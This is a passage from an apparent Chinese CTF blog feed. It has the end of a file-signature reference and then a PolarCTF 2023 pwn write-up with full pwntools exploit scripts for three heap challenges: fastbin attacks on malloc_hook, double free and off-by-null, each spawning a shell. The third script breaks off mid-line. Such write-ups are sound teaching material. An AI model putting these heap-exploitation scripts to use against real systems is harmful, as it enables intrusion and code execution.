class="headerlink" title="3、压缩包文件"></a><strong>3、压缩包文件</strong></h4><ul><li>ZIP Archive (zip) 文件头：<code>50 4B 03 04</code> 文件尾：<code>50 4B</code></li><li>RAR Archive (rar) 文件头：<code>52 61 72 21</code></li></ul><h4 id="4、音频文件"><a href="#4、音频文件" class="headerlink" title="4、音频文件"></a><strong>4、音频文件</strong></h4><ul><li>Wave (wav) 文件头：<code>57 41 56 45</code></li><li>audio(Audio) 文件头： <code>4D 54 68 64</code></li><li>audio/x-aac（aac）</li><li>文件头：<code>FF F1(9)</code></li></ul><h4 id="5、视频文件"><a href="#5、视频文件" class="headerlink" title="5、视频文件"></a><strong>5、视频文件</strong></h4><ul><li>AVI (avi) 文件头：<code>41 56 49 20</code></li><li>Real Audio (ram) 文件头：<code>2E 72 61 FD</code></li><li>Real Media (rm) 文件头：<code>2E 52 4D 46</code></li><li>MPEG (mpg) 文件头：<code>00 00 01 BA(3)</code></li><li>Quicktime (mov) 文件头：<code>6D 6F 6F 76</code></li><li>Windows Media (asf) 文件头：<code>30 26 B2 75 8E 66 CF 11</code></li><li>MIDI (mid) 文件头：<code>4D 54 68 64</code></li></ul><h4 id="6、代码文件"><a href="#6、代码文件" class="headerlink" title="6、代码文件"></a><strong>6、代码文件</strong></h4><ul><li>XML (xml) 文件头：<code>3C 3F 78 6D 6C</code></li><li>HTML (html) 文件头：<code>68 74 6D 6C 3E</code></li><li>Quicken (qdf) 文件头：<code>AC 9E BD 8F</code></li><li>Windows Password (pwl) 文件头：<code>E3 82 85 96</code></li></ul><h4 id="7、其他类型"><a href="#7、其他类型" class="headerlink" title="7、其他类型"></a><strong>7、其他类型</strong></h4><ul><li>windows证书文件(der) 文件头：<code>30 82 03 C9</code></li><li>CAD (dwg) 文件头：<code>41 43 31 30</code></li><li>Windows Shortcut (lnk) 文件头：<code>4C 00 00 00</code></li><li>Windows reg(reg) 文件头：<code>52 45 47 45 44 49 54 34</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&quot;常见文件文件头和隐写术总结-CTF中Misc必备&quot;&gt;&lt;a href=&quot;#常见文件文件头和隐写术总结-CTF中Mis</summary>
      
    
    
    
    <category term="Misc" scheme="https://kylinxin.github.io/categories/Misc/"/>
    
    
    <category term="misc" scheme="https://kylinxin.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>PolarCTF_2023_wp</title>
    <link href="https://kylinxin.github.io/2023/09/27/PolarCTF_2023_wp/"/>
    <id>https://kylinxin.github.io/2023/09/27/PolarCTF_2023_wp/</id>
    <published>2023-09-27T15:14:29.000Z</published>
    <updated>2023-09-30T09:10:52.078Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><blockquote><p>记录一下 一次比赛的复盘，除了夕阳下的舞者有点难度之外，其他题目难度还适中，最后也是拿到了不错的排名！期待12月份的Polar D&amp;N的冬季赛！</p></blockquote><p class='item-img' data-src='https://s2.loli.net/2023/09/30/ENZdsnHgIiDKFzQ.png'><img src="https://s2.loli.net/2023/09/30/ENZdsnHgIiDKFzQ.png" alt="image.png"></p><p>最后每道题目都有官方视频讲解，链接 <a href="https://www.bilibili.com/video/BV1fr4y1Z73F?p=1&amp;vd_source=5c5a710dfdccbb5b7b821586612058bd">【PWN】小狗汪汪汪_哔哩哔哩_bilibili</a></p><h2 id="emo-chunk"><a href="#emo-chunk" class="headerlink" title="emo_chunk"></a>emo_chunk</h2><h3 id="程序保护"><a href="#程序保护" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul><li>堆溢出，可以通过溢出chunk内容，从而修改下一个chunk的size字段，制造堆块重叠，将下一个chunk大小改为small chunk，这样free掉之后，会放入unsortedbin中，fd和bk都指向main_arena_88</li><li>然后可以通过打印函数泄露libc地址</li><li>利用fastbin的特性，向malloc_hook-0x23的位置申请chunk，覆写malloc_hook</li></ul><blockquote><p>注意一般思路是这样的，但是题目具体要使用realloc_hook来进行调栈，具体操作为改realloc_hook为onegadget，malloc_hook为realloc_hook，这样执行malloc时，会实现二级跳。malloc_hook -&gt; realloc_hook -&gt; onegadget</p></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote('123.60.135.228',2094)</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> p,elf,libc<br>    p = process(<span class="hljs-string">'./emo_chunk'</span>)<br>    <span class="hljs-comment">#p = remote('123.60.135.228',2064)</span><br>    elf = ELF(<span class="hljs-string">'./emo_chunk'</span>)<br>    libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'Please Choice!\n'</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Size:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">'Change EMo Content\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    cmd(<span class="hljs-string">"5"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">i,j</span>):<br><br>    heaparray = <span class="hljs-number">0x6020E0</span><br>    backdoor = <span class="hljs-number">0x400946</span><br>    free_got = elf.got[<span class="hljs-string">'free'</span>]<br><br>    <span class="hljs-comment">#创建几个chunk</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#5 隔离top chunk</span><br><br>    <span class="hljs-comment">#泄露libc</span><br>    edit(<span class="hljs-number">0</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">'\xe1'</span> + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">7</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">#debug()</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#1</span><br>    show(<span class="hljs-number">2</span>)<br>    libc_base = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x3c4b78</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"libc_base -&gt; "</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment">#计算地址</span><br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<br>    realloc = libc_base + libc.sym[<span class="hljs-string">'realloc'</span>]<br><br>    one = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br>    one_gadget = libc_base + one[i]<br><br>    delete(<span class="hljs-number">4</span>)<br><br>    edit(<span class="hljs-number">3</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook - <span class="hljs-number">0x23</span>))<br>    <span class="hljs-comment">#debug()</span><br><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#malloc 6</span><br><br>    <span class="hljs-comment">#思路1,将malloc_hook改成one_gadget，但是打不通</span><br>    <span class="hljs-comment">#payload = 'a'*(0x23-0x10) + p64(one_gadget)</span><br>    <span class="hljs-comment">#思路2,将realloc_hook改成one_gadget,调栈</span><br>    <span class="hljs-comment">#payload = 'a'*(0x23-0x10-0x8) + p64(one_gadget) + p64(realloc + j) #将malloc_hook修改成realloc_hook</span><br>    <span class="hljs-comment">#思路3,题目有后门,直接改malloc_hook为后门函数</span><br>    payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x23</span>-<span class="hljs-number">0x10</span>) + p64(backdoor)<br>    edit(<span class="hljs-number">6</span>,payload)<br><br>    add(<span class="hljs-number">0x68</span>)<br><br>    p.interactive()<br><br><br><span class="hljs-comment"># for i in range(4):</span><br><span class="hljs-comment">#     for j in [2,4,6,8,10]:</span><br><span class="hljs-comment">#         try:</span><br><span class="hljs-comment">#             print("i :",i)</span><br><span class="hljs-comment">#             print("j :",j)</span><br><span class="hljs-comment">#             p = process('./emo_chunk')</span><br><span class="hljs-comment">#             pwn(i,int(j))</span><br><span class="hljs-comment">#         except:</span><br><span class="hljs-comment">#             p.close()</span><br><span class="hljs-comment">#注释为暴力调栈,得出i = 1, j = 8</span><br><br>connect()<br>pwn(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>)<br><br><span class="hljs-string">'''</span><br><span class="hljs-string">0x45226execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527aexecve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4execve("/bin/sh", rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247execve("/bin/sh", rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">'''</span><br></code></pre></td></tr></tbody></table></figure><h2 id="double-free"><a href="#double-free" class="headerlink" title="double  free"></a>double  free</h2><h3 id="程序保护-1"><a href="#程序保护-1" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>double free 可以申请任何我们想要的地址的一个chunk，进而修改内容，本题目就是修改bss段上的值为固定值，进而getshell，具体做法就是申请2个chunk，制造double ，free，形成chunk 1 -&gt; chunk 2 &lt;- chunk 1，修改chunk 1 的指向为目标地址，然后通过连续的malloc 4次，既可申请到目标地址，最后修改chunk内容即可</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">'linux'</span>, arch=<span class="hljs-string">'amd64'</span>, log_level=<span class="hljs-string">'debug'</span>)<br>p = process(<span class="hljs-string">'./heap_Double_Free'</span>)<br><span class="hljs-comment">#p = remote('123.60.135.228',2133)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'root@ubuntu:~/Desktop$ '</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,size,content</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'please input id and size :\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getshell</span>():<br>    cmd(<span class="hljs-string">"4"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br><br>goal = <span class="hljs-number">0x6010b0</span> <span class="hljs-comment">#将这里的值改为 257</span><br>fd = <span class="hljs-number">0x6010b0</span><br>create(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#0</span><br>create(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'bbbb'</span>) <span class="hljs-comment">#1</span><br><span class="hljs-comment">#create(2,16,'cccc') #2 防止和topchunk合并</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#double free</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,p64(goal-<span class="hljs-number">0x10</span>)) <span class="hljs-comment">#3</span><br>create(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#4</span><br>create(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#5</span><br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,p64(<span class="hljs-number">0x101</span>)) <span class="hljs-comment">#6</span><br>debug()<br>getshell()<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="easychunk"><a href="#easychunk" class="headerlink" title="easychunk"></a>easychunk</h2><h3 id="程序保护-2"><a href="#程序保护-2" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>offbynull </p><ul><li>申请4个chunk，free掉chunk 0。然后编辑chunk1，覆写chunk2的prev_size为chunk0 + chun1，size低位为0，表示前面的chunk为free chunk</li><li>chunk 0 chunk 1 会合并，但是 chunk 1 始终存在，合并后放入了unsorted bin 中，申请一个同样大小的chunk 5收回chunk0，这样chunk 1的fd 和bk都是main_arena_88，泄露libc地址</li><li>最后通过fastbin向malloc_hook-0x23申请地址，最后修改malloc_hook 为 og</li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote('123.60.135.228',2094)</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> p,elf,libc<br>    local = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> local:<br>        p = process(<span class="hljs-string">'./easychunk'</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2114</span>)<br>    elf = ELF(<span class="hljs-string">'./easychunk'</span>)<br>    libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'Please Choice!\n'</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please give me a name for item:\n'</span>)<br>    p.sendline(<span class="hljs-string">'aaaa'</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Size:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">'Content of Emo!:\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">'Change EMo Content\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    cmd(<span class="hljs-string">"5"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br><br>    dem = <span class="hljs-string">"hello,everyone.Welcome to:Polar D&amp;N:"</span><br>    p.recvuntil(<span class="hljs-string">'Where are you from?\n'</span>)<br>    p.sendline(dem)<br>    <span class="hljs-comment">#申请几个chunk</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"aaaa"</span>) <span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"bbbb"</span>) <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"cccc"</span>) <span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"dddd"</span>) <span class="hljs-comment">#3</span><br><br>    <span class="hljs-comment">#free掉chunk0</span><br>    delete(<span class="hljs-number">0</span>) <span class="hljs-comment">#0</span><br>    <span class="hljs-comment">#通过编辑chunk1溢出chunk2的size的inues位为0,注意chunk2的prevsize位为chunk0size+chunk2size</span><br>    pay0 = <span class="hljs-string">'a'</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0x200</span>)<br>    edit(<span class="hljs-number">1</span>,pay0)<br>    delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#2</span><br><br>    <span class="hljs-comment">#泄露libc</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"aaaa"</span>) <span class="hljs-comment">#0</span><br>    show(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">'content:\n'</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span 